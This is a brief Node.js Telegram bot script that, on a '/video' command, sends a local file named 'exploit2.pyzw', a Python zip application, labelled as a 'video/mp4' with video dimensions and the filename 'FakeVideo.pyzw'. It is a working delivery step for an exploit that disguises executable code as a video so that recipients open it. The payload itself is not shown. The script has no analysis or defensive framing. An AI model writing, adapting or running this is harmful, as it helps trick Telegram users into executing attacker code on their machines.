const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");

const token = "<BOT_TOKEN>";

const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/video/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendVideo(
    chatId,
    fs.readFileSync("exploit2.pyzw"),
    {
      width: 300,
      height: 300,
      duration: 30,
      // thumbnail: "https://duckduckgo.com/favicon.ico",
    }, {
      filename: "FakeVideo.pyzw",
      contentType: "video/mp4"
    }
  );
});